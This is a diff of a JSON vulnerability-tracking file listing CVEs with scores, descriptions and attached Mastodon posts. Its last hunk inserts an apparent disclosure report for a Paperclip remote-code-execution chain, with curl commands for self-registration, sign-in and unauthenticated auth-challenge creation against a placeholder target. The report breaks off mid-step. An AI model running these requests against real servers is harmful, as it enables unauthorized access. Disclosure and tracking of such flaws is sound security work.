-    "description": "The OWASP core rule set (CRS) is a set of generic attack detection rules for use with compatible web application firewalls. Prior to versions 3.3.9 and 4.25.0, a bypass was identified in OWASP CRS that allows uploading files with dangerous extensions (.php, .phar, .jsp, .jspx) by inserting whitespace padding in the filename (e.g. photo. php or shell.jsp ). The affected rules do not normalize whitespace before evaluating the file extension regex, so the dot-extension check fails to match. This issue has been patched in versions 3.3.9 and 4.25.0.",
+    "description": "N/A",
     "repos": [],
-    "updated": "2026-07-24T21:10:00.143000",
+    "updated": null,
     "epss": 3.579
   },
   "CVE-2026-0288": {
@@ -16723,7 +16549,7 @@
     ],
     "description": "Multiple buffer overflow vulnerabilities in the User-ID Terminal Server Agent (TSA) component of Palo Alto Networks PAN-OS software allow an unauthenticated attacker with network access to cause a denial of service (DoS) condition or potentially execute arbitrary code by sending specially crafted network traffic.\n\nThe security risk posed by this issue is minimized when the User-ID Terminal Server Agent connectivity is restricted to only trusted internal IP addresses according to our recommended  best practice deployment guidelines https://docs.paloaltonetworks.com/ngfw/help/10-2/user-identification/device-user-identification-terminal-services-agents#:~:text=To%20minimize%20security%20risk%2C%20restrict%20TS%20Agent%20connectivity%20to%20trusted%20internal%20IP%20addresses%20only. .\n\nPanorama is not impacted by this vulnerability.",
     "repos": [],
-    "updated": "2026-07-10T18:33:13",
+    "updated": "2026-07-10T15:45:17.463000",
     "epss": 0.844
   },
   "CVE-2026-28299": {
@@ -16833,7 +16659,7 @@
     ],
     "description": "SolarWinds Web Help Desk is found to be affected by a SAML authentication bypass vulnerability. This requires the SAML 2.0 authentication method to be enabled.",
     "repos": [],
-    "updated": "2026-07-31T04:17:19.927000",
+    "updated": "2026-07-30T18:31:47",
     "epss": 0.638
   },
   "CVE-2026-9169": {
@@ -16965,7 +16791,7 @@
     ],
     "description": "A flaw was found in dracut. The die() error-handling function writes its message into a shell script under the initramfs emergency-hook directory without properly shell-quoting it. When the message contains data derived from the DHCP ROOT_PATH option, an attacker on the adjacent network who controls a rogue DHCP server can inject a command-substitution sequence that executes as root the next time dracut sources its emergency hook scripts during standard boot-failure handling.",
     "repos": [],
-    "updated": "2026-08-07T12:32:06",
+    "updated": "2026-08-07T18:17:09.020000",
     "epss": 0.25
   },
   "CVE-2026-19264": {
@@ -17063,7 +16889,7 @@
           "header_description": "Vista a\u00e9rea da Pra\u00e7a do Marco Zero, pr\u00e9dios hist\u00f3ricos e outras constru\u00e7\u00f5es do Recife Antigo, com o rio Capibaribe de fundo e um sol laranja ao longe.",
           "followers_count": 1336,
           "following_count": 653,
-          "statuses_count": 18728,
+          "statuses_count": 18729,
           "last_status_at": "2026-08-09",
           "hide_collections": true,
           "show_media": true,
@@ -17117,8 +16943,8 @@
           "fields": [
             {
               "name": "Apoie a Bolhinha",
-              "value": "<a href=\"https://apoie.bolha.one\" target=\"_blank\" rel=\"nofollow noopener\" translate=\"no\"><span class=\"invisible\">https://</span><span class=\"\">apoie.bolha.one</span><span class=\"invisible\"></span></a>",
-              "verified_at": "2026-08-09T20:50:42.645+00:00"
+              "value": "<a href=\"https://apoie.bolha.one\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://</span><span class=\"\">apoie.bolha.one</span><span class=\"invisible\"></span></a>",
+              "verified_at": null
             },
             {
               "name": "Gorjeta pro admin",
@@ -17127,8 +16953,8 @@
             },
             {
               "name": "Meu site",
-              "value": "<a href=\"https://cadu.cc\" target=\"_blank\" rel=\"nofollow noopener\" translate=\"no\"><span class=\"invisible\">https://</span><span class=\"\">cadu.cc</span><span class=\"invisible\"></span></a>",
-              "verified_at": "2026-08-09T20:50:43.182+00:00"
+              "value": "<a href=\"https://cadu.cc\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://</span><span class=\"\">cadu.cc</span><span class=\"invisible\"></span></a>",
+              "verified_at": null
             },
             {
               "name": "Pronouns",
@@ -17333,124 +17159,15 @@
     ],
     "description": "In the Linux kernel, the following vulnerability has been resolved:\n\nKVM: x86: Check for invalid/obsolete root *after* making MMU pages available\n\nCheck for a \"stale\" page fault, i.e. for an invalid and/or obsolete root,\nafter making MMU pages available for the shadow MMU.  If reclaiming shadow\npages zaps an in-use root, i.e. marks it invalid, then KVM will attempt to\nmap memory into an invalid root.  On its own, populating an invalid root is\n\"fine\", but because child shadow pages inherit their parent's role, any\nchildren created during the map/fetch will be created as invalid pages,\nthus violating KVM's invariant that invalid pages are never on the list of\nactive MMU pages.\n\nNote, the underlying flaw has existed since KVM first started tracking\ninvalid roots in 2008 (commit 2e53d63acba7, \"KVM: MMU: ignore zapped root\npagetables\"), but the true badness only came along in 2020 (Linux 5.9)\nwith the invariant that invalid shadow pages can't be on the list of\nactive pages.\n\nNote #2, inheriting role.invalid when creating child shadow pages is also\nfar from ideal; that flaw will be addressed separately.",
     "repos": [
+      "https://github.com/aarif450/aarif450.github.io",
       "https://github.com/Aoripus-LTD/Zapscape-Fix",
       "https://github.com/aarif450/Zapscape",
-      "https://github.com/chuzhongyun/CVE-2026-64561-Kernel-Fix",
-      "https://github.com/aarif450/aarif450.github.io",
       "https://github.com/HackSpeak/CVE-2026-64561",
+      "https://github.com/chuzhongyun/CVE-2026-64561-Kernel-Fix",
       "https://github.com/HORKimhab/CVE-2026-64561"
     ],
-    "updated": "2026-08-09T04:17:43.110000",
+    "updated": "2026-08-09T06:31:34",
     "epss": 0.121
-  },
-  "CVE-2026-65667": {
-    "cvss3": 10.0,
-    "severity": "CRITICAL",
-    "epss_severity": "LOW",
-    "nuclei": null,
-    "posts": [
-      {
-        "account": {
-          "id": "110560587680388288",
-          "username": "AAKL",
-          "acct": "AAKL@infosec.exchange",
-          "display_name": "AA",
-          "locked": true,
-          "bot": false,
-          "discoverable": true,
-          "indexable": true,
-          "group": false,
-          "created_at": "2023-06-17T00:00:00.000Z",
-          "note": "<p>Always questioning. Latest news focused on  <a href=\"https://infosec.exchange/tags/cybersecurity\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>cybersecurity</span></a>, <a href=\"https://infosec.exchange/tags/privacy\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>privacy</span></a>, <a href=\"https://infosec.exchange/tags/Linux\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>Linux</span></a>, <a href=\"https://infosec.exchange/tags/Apple\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>Apple</span></a>, <a href=\"https://infosec.exchange/tags/Microsoft\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>Microsoft</span></a>, <a href=\"https://infosec.exchange/tags/Google\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>Google</span></a>, <a href=\"https://infosec.exchange/tags/AI\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>AI</span></a>, and the tech industry in general. Toxicity is not tolerated. I follow like interests.</p><p>Check your facts. </p><p>- FactCheck.org <a href=\"https://www.factcheck.org/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"\">factcheck.org/</span><span class=\"invisible\"></span></a><br>- Reuters Fact Check <a href=\"https://www.reuters.com/fact-check/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"\">reuters.com/fact-check/</span><span class=\"invisible\"></span></a><br>- AP Fact Check <a href=\"https://apnews.com/ap-fact-check\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://</span><span class=\"\">apnews.com/ap-fact-check</span><span class=\"invisible\"></span></a><br>- Snopes <a href=\"https://www.snopes.com/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"\">snopes.com/</span><span class=\"invisible\"></span></a><br>- Politifact <a href=\"https://www.politifact.com/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"\">politifact.com/</span><span class=\"invisible\"></span></a></p><p>NordVPN Link Checker: <a href=\"https://nordvpn.com/link-checker/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://</span><span class=\"\">nordvpn.com/link-checker/</span><span class=\"invisible\"></span></a></p><p>Project 2025 Tracker <a href=\"https://www.project2025.observer/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"\">project2025.observer/</span><span class=\"invisible\"></span></a></p>",
-          "url": "https://infosec.exchange/@AAKL",
-          "uri": "https://infosec.exchange/users/AAKL",
-          "avatar": "https://files.ioc.exchange/iocexchange/cache/accounts/avatars/110/560/587/680/388/288/original/2e8ae102d75ba1dc.png",
-          "avatar_static": "https://files.ioc.exchange/iocexchange/cache/accounts/avatars/110/560/587/680/388/288/original/2e8ae102d75ba1dc.png",
-          "avatar_description": "",
-          "header": "https://files.ioc.exchange/iocexchange/cache/accounts/headers/110/560/587/680/388/288/original/6bcb632eb380a777.png",
-          "header_static": "https://files.ioc.exchange/iocexchange/cache/accounts/headers/110/560/587/680/388/288/original/6bcb632eb380a777.png",
-          "header_description": "",
-          "followers_count": 670,
-          "following_count": 526,
-          "statuses_count": 508,
-          "last_status_at": "2026-08-09",
-          "hide_collections": true,
-          "show_media": true,
-          "show_media_replies": true,
-          "show_featured": true,
-          "feature_approval": {
-            "automatic": [
-              "followers"
-            ],
-            "manual": [],
-            "current_user": "denied"
-          },
-          "emojis": [],
-          "fields": []
-        },
-        "url": "https://infosec.exchange/@AAKL/117055056468727752",
-        "content": "<p>If you missed these yesterday.</p><p>\"Three of the issues, CVE-2026-63508, CVE-2026-56162, and CVE-2026-65667, have a maximum severity rating of 10/10.\"</p><p>Security Week: Microsoft, Apple Release Fresh Security Updates <a href=\"https://www.securityweek.com/microsoft-apple-release-fresh-security-updates/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"ellipsis\">securityweek.com/microsoft-app</span><span class=\"invisible\">le-release-fresh-security-updates/</span></a> <a href=\"https://infosec.exchange/tags/Microsoft\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>Microsoft</span></a> <a href=\"https://infosec.exchange/tags/Apple\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>Apple</span></a> <a href=\"https://infosec.exchange/tags/infosec\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>infosec</span></a> <a href=\"https://infosec.exchange/tags/vylnerability\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>vylnerability</span></a> <a href=\"https://infosec.exchange/tags/Apple\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>Apple</span></a></p>",
-        "created_at": "2026-08-07T16:00:15.000Z"
-      },
-      {
-        "account": {
-          "id": "115780929217569257",
-          "username": "thehackerwire",
-          "acct": "thehackerwire@mastodon.social",
-          "display_name": "TheHackerWire",
-          "locked": false,
-          "bot": true,
-          "discoverable": true,
-          "indexable": true,
-          "group": false,
-          "created_at": "2025-12-21T00:00:00.000Z",
-          "note": "<p>Cybersecurity Chronicles \ud83c\udf10 | Breaking down the latest in security news, <a href=\"https://mastodon.social/tags/hacking\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>hacking</span></a> <a href=\"https://mastodon.social/tags/darkweb\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>darkweb</span></a> <a href=\"https://mastodon.social/tags/Cybersecurity\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>Cybersecurity</span></a> <a href=\"https://mastodon.social/tags/InfoSec\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>InfoSec</span></a> <a href=\"https://mastodon.social/tags/HackingNews\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>HackingNews</span></a></p>",
-          "url": "https://mastodon.social/@thehackerwire",
-          "uri": "https://mastodon.social/ap/users/115755483699003887",
-          "avatar": "https://files.ioc.exchange/iocexchange/cache/accounts/avatars/115/780/929/217/569/257/original/341133aeca71aa2f.jpg",
-          "avatar_static": "https://files.ioc.exchange/iocexchange/cache/accounts/avatars/115/780/929/217/569/257/original/341133aeca71aa2f.jpg",
-          "avatar_description": "",
-          "header": "https://files.ioc.exchange/iocexchange/cache/accounts/headers/115/780/929/217/569/257/original/08799dcde5207ae9.jpeg",
-          "header_static": "https://files.ioc.exchange/iocexchange/cache/accounts/headers/115/780/929/217/569/257/original/08799dcde5207ae9.jpeg",
-          "header_description": "",
-          "followers_count": 207,
-          "following_count": 2,
-          "statuses_count": 8542,
-          "last_status_at": "2026-08-09",
-          "hide_collections": false,
-          "show_media": true,
-          "show_media_replies": true,
-          "show_featured": true,
-          "feature_approval": {
-            "automatic": [
-              "public"
-            ],
-            "manual": [],
-            "current_user": "automatic"
-          },
-          "emojis": [],
-          "fields": [
-            {
-              "name": "Website",
-              "value": "<a href=\"https://www.thehackerwire.com/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"\">thehackerwire.com/</span><span class=\"invisible\"></span></a>",
-              "verified_at": null
-            },
-            {
-              "name": "X",
-              "value": "<a href=\"https://x.com/TheHackerWire\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://</span><span class=\"\">x.com/TheHackerWire</span><span class=\"invisible\"></span></a>",
-              "verified_at": null
-            }
-          ]
-        },
-        "url": "https://mastodon.social/@thehackerwire/117051518462534033",
-        "content": "<p>\ud83d\udd34 CVE-2026-65667 - Critical (10)</p><p>Missing authorization in Microsoft Teams allows an unauthorized attacker to elevate privileges over a network.</p><p>\ud83d\udd17 <a href=\"https://www.thehackerwire.com/vulnerability/CVE-2026-65667/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"ellipsis\">thehackerwire.com/vulnerabilit</span><span class=\"invisible\">y/CVE-2026-65667/</span></a></p><p><a href=\"https://mastodon.social/tags/CVE\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>CVE</span></a> <a href=\"https://mastodon.social/tags/vulnerability\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>vulnerability</span></a> <a href=\"https://mastodon.social/tags/infosec\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>infosec</span></a> <a href=\"https://mastodon.social/tags/cybersecurity\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>cybersecurity</span></a> <a href=\"https://mastodon.social/tags/security\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>security</span></a> <a href=\"https://mastodon.social/tags/Tenda\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>Tenda</span></a> <a href=\"https://mastodon.social/tags/patchstack\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>patchstack</span></a></p>",
-        "created_at": "2026-08-07T01:00:29.000Z"
-      }
-    ],
-    "description": "Missing authorization in Microsoft Teams allows an unauthorized attacker to elevate privileges over a network.",
-    "repos": [],
-    "updated": "2026-08-07T00:31:33",
-    "epss": 0.44200000000000006
   },
   "CVE-2026-63508": {
     "cvss3": 10.0,
@@ -17626,6 +17343,115 @@
       }
     ],
     "description": "Missing authentication for critical function in Microsoft Planetary Computer Pro allows an unauthorized attacker to elevate privileges over a network.",
+    "repos": [],
+    "updated": "2026-08-07T17:48:43.770000",
+    "epss": 0.44200000000000006
+  },
+  "CVE-2026-65667": {
+    "cvss3": 10.0,
+    "severity": "CRITICAL",
+    "epss_severity": "LOW",
+    "nuclei": null,
+    "posts": [
+      {
+        "account": {
+          "id": "110560587680388288",
+          "username": "AAKL",
+          "acct": "AAKL@infosec.exchange",
+          "display_name": "AA",
+          "locked": true,
+          "bot": false,
+          "discoverable": true,
+          "indexable": true,
+          "group": false,
+          "created_at": "2023-06-17T00:00:00.000Z",
+          "note": "<p>Always questioning. Latest news focused on  <a href=\"https://infosec.exchange/tags/cybersecurity\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>cybersecurity</span></a>, <a href=\"https://infosec.exchange/tags/privacy\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>privacy</span></a>, <a href=\"https://infosec.exchange/tags/Linux\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>Linux</span></a>, <a href=\"https://infosec.exchange/tags/Apple\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>Apple</span></a>, <a href=\"https://infosec.exchange/tags/Microsoft\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>Microsoft</span></a>, <a href=\"https://infosec.exchange/tags/Google\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>Google</span></a>, <a href=\"https://infosec.exchange/tags/AI\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>AI</span></a>, and the tech industry in general. Toxicity is not tolerated. I follow like interests.</p><p>Check your facts. </p><p>- FactCheck.org <a href=\"https://www.factcheck.org/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"\">factcheck.org/</span><span class=\"invisible\"></span></a><br>- Reuters Fact Check <a href=\"https://www.reuters.com/fact-check/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"\">reuters.com/fact-check/</span><span class=\"invisible\"></span></a><br>- AP Fact Check <a href=\"https://apnews.com/ap-fact-check\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://</span><span class=\"\">apnews.com/ap-fact-check</span><span class=\"invisible\"></span></a><br>- Snopes <a href=\"https://www.snopes.com/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"\">snopes.com/</span><span class=\"invisible\"></span></a><br>- Politifact <a href=\"https://www.politifact.com/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"\">politifact.com/</span><span class=\"invisible\"></span></a></p><p>NordVPN Link Checker: <a href=\"https://nordvpn.com/link-checker/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://</span><span class=\"\">nordvpn.com/link-checker/</span><span class=\"invisible\"></span></a></p><p>Project 2025 Tracker <a href=\"https://www.project2025.observer/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"\">project2025.observer/</span><span class=\"invisible\"></span></a></p>",
+          "url": "https://infosec.exchange/@AAKL",
+          "uri": "https://infosec.exchange/users/AAKL",
+          "avatar": "https://files.ioc.exchange/iocexchange/cache/accounts/avatars/110/560/587/680/388/288/original/2e8ae102d75ba1dc.png",
+          "avatar_static": "https://files.ioc.exchange/iocexchange/cache/accounts/avatars/110/560/587/680/388/288/original/2e8ae102d75ba1dc.png",
+          "avatar_description": "",
+          "header": "https://files.ioc.exchange/iocexchange/cache/accounts/headers/110/560/587/680/388/288/original/6bcb632eb380a777.png",
+          "header_static": "https://files.ioc.exchange/iocexchange/cache/accounts/headers/110/560/587/680/388/288/original/6bcb632eb380a777.png",
+          "header_description": "",
+          "followers_count": 670,
+          "following_count": 526,
+          "statuses_count": 508,
+          "last_status_at": "2026-08-09",
+          "hide_collections": true,
+          "show_media": true,
+          "show_media_replies": true,
+          "show_featured": true,
+          "feature_approval": {
+            "automatic": [
+              "followers"
+            ],
+            "manual": [],
+            "current_user": "denied"
+          },
+          "emojis": [],
+          "fields": []
+        },
+        "url": "https://infosec.exchange/@AAKL/117055056468727752",
+        "content": "<p>If you missed these yesterday.</p><p>\"Three of the issues, CVE-2026-63508, CVE-2026-56162, and CVE-2026-65667, have a maximum severity rating of 10/10.\"</p><p>Security Week: Microsoft, Apple Release Fresh Security Updates <a href=\"https://www.securityweek.com/microsoft-apple-release-fresh-security-updates/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"ellipsis\">securityweek.com/microsoft-app</span><span class=\"invisible\">le-release-fresh-security-updates/</span></a> <a href=\"https://infosec.exchange/tags/Microsoft\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>Microsoft</span></a> <a href=\"https://infosec.exchange/tags/Apple\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>Apple</span></a> <a href=\"https://infosec.exchange/tags/infosec\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>infosec</span></a> <a href=\"https://infosec.exchange/tags/vylnerability\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>vylnerability</span></a> <a href=\"https://infosec.exchange/tags/Apple\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>Apple</span></a></p>",
+        "created_at": "2026-08-07T16:00:15.000Z"
+      },
+      {
+        "account": {
+          "id": "115780929217569257",
+          "username": "thehackerwire",
+          "acct": "thehackerwire@mastodon.social",
+          "display_name": "TheHackerWire",
+          "locked": false,
+          "bot": true,
+          "discoverable": true,
+          "indexable": true,
+          "group": false,
+          "created_at": "2025-12-21T00:00:00.000Z",
+          "note": "<p>Cybersecurity Chronicles \ud83c\udf10 | Breaking down the latest in security news, <a href=\"https://mastodon.social/tags/hacking\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>hacking</span></a> <a href=\"https://mastodon.social/tags/darkweb\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>darkweb</span></a> <a href=\"https://mastodon.social/tags/Cybersecurity\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>Cybersecurity</span></a> <a href=\"https://mastodon.social/tags/InfoSec\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>InfoSec</span></a> <a href=\"https://mastodon.social/tags/HackingNews\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>HackingNews</span></a></p>",
+          "url": "https://mastodon.social/@thehackerwire",
+          "uri": "https://mastodon.social/ap/users/115755483699003887",
+          "avatar": "https://files.ioc.exchange/iocexchange/cache/accounts/avatars/115/780/929/217/569/257/original/341133aeca71aa2f.jpg",
+          "avatar_static": "https://files.ioc.exchange/iocexchange/cache/accounts/avatars/115/780/929/217/569/257/original/341133aeca71aa2f.jpg",
+          "avatar_description": "",
+          "header": "https://files.ioc.exchange/iocexchange/cache/accounts/headers/115/780/929/217/569/257/original/08799dcde5207ae9.jpeg",
+          "header_static": "https://files.ioc.exchange/iocexchange/cache/accounts/headers/115/780/929/217/569/257/original/08799dcde5207ae9.jpeg",
+          "header_description": "",
+          "followers_count": 207,
+          "following_count": 2,
+          "statuses_count": 8542,
+          "last_status_at": "2026-08-09",
+          "hide_collections": false,
+          "show_media": true,
+          "show_media_replies": true,
+          "show_featured": true,
+          "feature_approval": {
+            "automatic": [
+              "public"
+            ],
+            "manual": [],
+            "current_user": "automatic"
+          },
+          "emojis": [],
+          "fields": [
+            {
+              "name": "Website",
+              "value": "<a href=\"https://www.thehackerwire.com/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"\">thehackerwire.com/</span><span class=\"invisible\"></span></a>",
+              "verified_at": null
+            },
+            {
+              "name": "X",
+              "value": "<a href=\"https://x.com/TheHackerWire\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://</span><span class=\"\">x.com/TheHackerWire</span><span class=\"invisible\"></span></a>",
+              "verified_at": null
+            }
+          ]
+        },
+        "url": "https://mastodon.social/@thehackerwire/117051518462534033",
+        "content": "<p>\ud83d\udd34 CVE-2026-65667 - Critical (10)</p><p>Missing authorization in Microsoft Teams allows an unauthorized attacker to elevate privileges over a network.</p><p>\ud83d\udd17 <a href=\"https://www.thehackerwire.com/vulnerability/CVE-2026-65667/\" rel=\"nofollow noopener\" translate=\"no\" target=\"_blank\"><span class=\"invisible\">https://www.</span><span class=\"ellipsis\">thehackerwire.com/vulnerabilit</span><span class=\"invisible\">y/CVE-2026-65667/</span></a></p><p><a href=\"https://mastodon.social/tags/CVE\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>CVE</span></a> <a href=\"https://mastodon.social/tags/vulnerability\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>vulnerability</span></a> <a href=\"https://mastodon.social/tags/infosec\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>infosec</span></a> <a href=\"https://mastodon.social/tags/cybersecurity\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>cybersecurity</span></a> <a href=\"https://mastodon.social/tags/security\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>security</span></a> <a href=\"https://mastodon.social/tags/Tenda\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>Tenda</span></a> <a href=\"https://mastodon.social/tags/patchstack\" class=\"mention hashtag\" rel=\"nofollow noopener\" target=\"_blank\">#<span>patchstack</span></a></p>",
+        "created_at": "2026-08-07T01:00:29.000Z"
+      }
+    ],
+    "description": "Missing authorization in Microsoft Teams allows an unauthorized attacker to elevate privileges over a network.",
     "repos": [],
     "updated": "2026-08-07T00:31:33",
     "epss": 0.44200000000000006
@@ -17961,11 +17787,11 @@
     ],
     "description": "The JWT authentication mechanism accepts tokens signed with algorithms other than those explicitly configured or supported. This allows an attacker to craft a JWT with an unsupported algorithm, which is then incorrectly validated, leading to unauthorized access.\n\nSuccessful exploitation of this vulnerability may result in unauthorized access to the system, including the potential compromise of administrative accounts and full account takeover. The CVSS score is adjusted to 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) in single-tenant deployments, reflecting that the impact is contained within a single security authority boundary.",
     "repos": [],
-    "updated": "2026-08-06T15:31:57.827000",
+    "updated": "2026-08-06T09:30:40",
     "epss": 0.22300000000000003
   },
   "CVE-2026-54212": {
-    "cvss3": null,
+    "cvss3": 0,
     "severity": null,
     "epss_severity": "LOW",
     "nuclei": null,
@@ -18042,7 +17868,7 @@
     ],
     "description": "Tobit Laboratories AG TeamDavid's Webbox application implements an API endpoint that is vulnerable to a \nbuffer overflow condition. By submitting a specially crafted JSON body, \nsuch as one that is at least 8 characters long and begins with a number,\n an unauthenticated attacker can cause the server to crash, resulting in\n denial of service. Depending on the stack state or if a stack canary \ncan be disclosed through another vulnerability, this buffer overflow \ncould potentially lead to remote code execution and full compromise of \nthe server.\u00a0This issue affects TeamDavid through Rollout 524.",
     "repos": [],
-    "updated": "2026-08-07T12:32:06",
+    "updated": "2026-08-07T15:17:01.830000",
     "epss": 0.466
   },
   "CVE-2026-54213": {
@@ -18290,11 +18116,11 @@
         "created_at": "2026-08-07T08:59:53.000Z"
       }
     ],
-    "description": "Paperclip is a Node.js server and React UI that orchestrates a team of AI agents to run a business. Prior to version 2026.416.0, an unauthenticated attacker can achieve full remote code execution on any network-accessible Paperclip instance running in `authenticated` mode with default configuration. No user interaction, no credentials, just the target's address. The chain consists of six API calls. The attack is fully automated, requires no user interaction, and works against the default deployment configuration. Version 2026.416.0 patches the issue.",
+    "description": "## Summary\n\nAn unauthenticated attacker can achieve full remote code execution on any network-accessible Paperclip instance running in `authenticated` mode with default configuration. No user interaction, no credentials, just the target's address. The entire chain is six API calls.\n\nI verified every step against the latest version. I have a fully automated PoC script and a video recording available.\n\nDiscord: sagi03581\n\n## Steps to Reproduce\n\nThe attack chains four independent flaws to escalate from zero access to RCE:\n\n### Step 1: Create an account (no invite, no email verification)\n\n```bash\ncurl -s -X POST -H \"Content-Type: application/json\" \\\n  -d '{\"email\":\"attacker@evil.com\",\"password\":\"P@ssw0rd123\",\"name\":\"attacker\"}' \\\n  http://<target>:3100/api/auth/sign-up/email\n```\n\nReturns a valid account immediately. No invite token required, no email verification.\n\nThis works because `PAPERCLIP_AUTH_DISABLE_SIGN_UP` defaults to `false` in `server/src/config.ts:169-173`:\n\n```typescript\nconst authDisableSignUp: boolean =\n  disableSignUpFromEnv !== undefined\n    ? disableSignUpFromEnv === \"true\"\n    : (fileConfig?.auth?.disableSignUp ?? false);   // default: open\n```\n\nAnd email verification is hardcoded off in `server/src/auth/better-auth.ts:89-93`:\n\n```typescript\nemailAndPassword: {\n  enabled: true,\n  requireEmailVerification: false,\n  disableSignUp: config.authDisableSignUp,\n},\n```\n\nThe environment variable isn't documented in the deployment guide, so operators don't know it exists.\n\n### Step 2: Sign in\n\n```bash\ncurl -s -v -X POST -H \"Content-Type: application/json\" \\\n  -d '{\"email\":\"attacker@evil.com\",\"password\":\"P@ssw0rd123\"}' \\\n  http://<target>:3100/api/auth/sign-in/email\n```\n\nCapture the session cookie from the `Set-Cookie` header.\n\n### Step 3: Create a CLI auth challenge and self-approve it\n\nCreate the challenge (no authentication required at all):\n\n```bash\ncurl -s -X POST -H \"Content-Type: application/json\" \\\n  -d '{\"command\":\"test\"}' \\\n  http://<target>:3100/api/cli-auth/challenges\n```\n\nThe response includes a `token` and a `boardApiToken`. The handler at `server/src/routes/access.ts:1638-1659` has no actor check -- anyone can create a challenge.\n\nNow approve it with our own session:\n\n```bash\ncurl -s 